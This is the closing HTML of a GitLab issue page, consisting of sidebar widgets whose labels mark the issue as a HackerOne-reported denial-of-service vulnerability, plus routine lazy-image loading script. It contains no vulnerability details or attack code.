<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>

</div>
<div class="block epic" data-testid="sidebar-epic">
<div class="js-sidebar-epic-widget-root" data-can-edit="false" data-group-path="gitlab-org" data-issue-id="129825140" data-issue-iid="416225" data-project-path="gitlab-org/gitlab"></div>
</div>

<div class="js-sidebar-labels-widget-root" data-allow-label-create="" data-allow-scoped-labels="true" data-can-edit="" data-iid="416225" data-issuable-type="issue" data-labels-fetch-path="/gitlab-org/gitlab/-/labels.json?include_ancestor_groups=true" data-labels-manage-path="/gitlab-org/gitlab/-/labels" data-project-issues-path="/gitlab-org/gitlab/-/issues" data-project-path="gitlab-org/gitlab" data-selected-labels="[{&quot;id&quot;:22241940,&quot;title&quot;:&quot;Category:Team Planning&quot;,&quot;color&quot;:&quot;#6699cc&quot;,&quot;description&quot;:&quot;Plan, organize, and track team progress using Scrum, Kanban, SAFe, and other Agile methodologies.&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-10-22T13:33:21.426Z&quot;,&quot;updated_at&quot;:&quot;2021-10-22T13:33:21.426Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:17006635,&quot;title&quot;:&quot;Weakness::CWE-400&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;Denial of Service&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2020-11-09T22:14:41.441Z&quot;,&quot;updated_at&quot;:&quot;2020-11-09T22:14:41.441Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4107753,&quot;title&quot;:&quot;bug::vulnerability&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;A security vulnerability&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-22T15:15:09.960Z&quot;,&quot;updated_at&quot;:&quot;2022-03-16T11:32:16.336Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3103451,&quot;title&quot;:&quot;devops::plan&quot;,&quot;color&quot;:&quot;#E44D2A&quot;,&quot;description&quot;:&quot;Issues for the Plan stage of the DevOps lifecycle (e.g. Project Management, Agile Portfolio Management, Requirements Management)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-12-01T19:00:23.723Z&quot;,&quot;updated_at&quot;:&quot;2022-05-11T06:40:37.661Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:10690691,&quot;title&quot;:&quot;group::project management&quot;,&quot;color&quot;:&quot;#A8D695&quot;,&quot;description&quot;:&quot;Issues belonging to the Project Management group of the Plan stage of the DevOps lifecycle. See https://about.gitlab.com/handbook/product/categories/#team-planning-group | PM: @gweaver&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2019-05-22T19:55:45.218Z&quot;,&quot;updated_at&quot;:&quot;2020-08-28T15:40:02.313Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857523,&quot;title&quot;:&quot;priority::2&quot;,&quot;color&quot;:&quot;#ff8800&quot;,&quot;description&quot;:&quot;We will address this soon and will provide capacity from our team for it in the next few releases. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-04-13T08:01:55.497Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:23:35.254Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:14918378,&quot;title&quot;:&quot;section::dev&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Issues related to the Dev section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;updated_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713902,&quot;title&quot;:&quot;severity::2&quot;,&quot;color&quot;:&quot;#ff8800&quot;,&quot;description&quot;:&quot;Critical - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:34.880Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:12:15.351Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2278648,&quot;title&quot;:&quot;type::bug&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Issues that report undesirable or incorrect behavior. See https://handbook.gitlab.com/handbook/product/groups/product-analysis/engineering/metrics/#work-type-classification&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-07-07T20:20:34.868Z&quot;,&quot;updated_at&quot;:&quot;2024-11-08T09:52:16.699Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2526320,&quot;title&quot;:&quot;workflow::in dev&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Issues that are actively being worked on by a developer&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-08-22T19:48:54.168Z&quot;,&quot;updated_at&quot;:&quot;2020-10-06T14:56:32.883Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}]"></div>
<div class="block milestone" data-testid="sidebar-milestones">
<div class="js-sidebar-milestone-widget-root" data-can-edit="" data-issue-iid="416225" data-project-path="gitlab-org/gitlab"></div>
</div>
<div class="block" data-testid="iteration-container"><div class="js-sidebar-iteration-widget-root" data-can-edit="" data-group-path="gitlab-org" data-issue-id="129825140" data-issue-iid="416225" data-project-path="gitlab-org/gitlab"></div>
</div>
<div class="js-sidebar-weight-widget-root" data-can-edit="" data-issue-iid="416225" data-project-path="gitlab-org/gitlab"></div>

<div class="js-sidebar-due-date-widget-root"></div>
<div class="js-sidebar-time-tracking-root block">
<!-- / Fallback while content is loading -->
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Time tracking</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>
<div class="js-sidebar-health-status-widget-root" data-can-edit="" data-full-path="gitlab-org/gitlab" data-iid="416225" data-issuable-type="issue"></div>
<script id="js-confidential-issue-data" type="application/json">{"is_confidential":false,"is_editable":null}</script>
<div class="block">
<div class="hide-collapsed gl-flex gl-items-center gl-font-bold gl-leading-20 gl-text-default">
Confidentiality
</div>
<div class="hide-collapsed gl-text-subtle">
Confidentiality controls have moved to the issue actions menu (<svg class="s12 gl-align-middle" data-testid="ellipsis_v-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#ellipsis_v"></use></svg>) at the top of the page.
</div>
</div>

<div class="js-sidebar-participants-widget-root"></div>
</form><script class="js-sidebar-options" type="application/json">{"endpoint":"/gitlab-org/gitlab/-/issues/416225.json?serializer=sidebar_extras","toggleSubscriptionEndpoint":"/gitlab-org/gitlab/-/issues/416225/toggle_subscription","moveIssueEndpoint":"/gitlab-org/gitlab/-/issues/416225/move","projectsAutocompleteEndpoint":"/-/autocomplete/projects?project_id=278964","editable":"","currentUser":{},"rootPath":"/","fullPath":"gitlab-org/gitlab","iid":416225,"id":129825140,"severity":"unknown","timeTrackingLimitToHours":true,"canCreateTimelogs":null,"createNoteEmail":null,"issuableType":"issue","directlyInviteMembers":"false","weightOptions":["None","Any",0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20],"weightNoneValue":"None","multipleApprovalRulesAvailable":null}</script>
</div>
</aside>



</main>
</div>


</div>
</div>


<script nonce="PbUfvTZ5F3qTmEKt++iLGw==">
//<![CDATA[
if ('loading' in HTMLImageElement.prototype) {
  document.querySelectorAll('img.lazy').forEach(img => {
    img.loading = 'lazy';
    let imgUrl = img.dataset.src;
    // Only adding width + height for avatars for now
    if (imgUrl.indexOf('/avatar/') > -1 && imgUrl.indexOf('?') === -1) {
      const targetWidth = img.getAttribute('width') || img.width;
      imgUrl += `?width=${targetWidth}`;
    }
    img.src = imgUrl;
    img.removeAttribute('data-src');
    img.classList.remove('lazy');
    img.classList.add('js-lazy-loaded');
    img.dataset.testid = 'js-lazy-loaded-content';
  });
}

//]]>
</script>
<script nonce="PbUfvTZ5F3qTmEKt++iLGw==">
//<![CDATA[
gl = window.gl || {};
gl.experiments = {};


//]]>
</script>

</body>
</html>

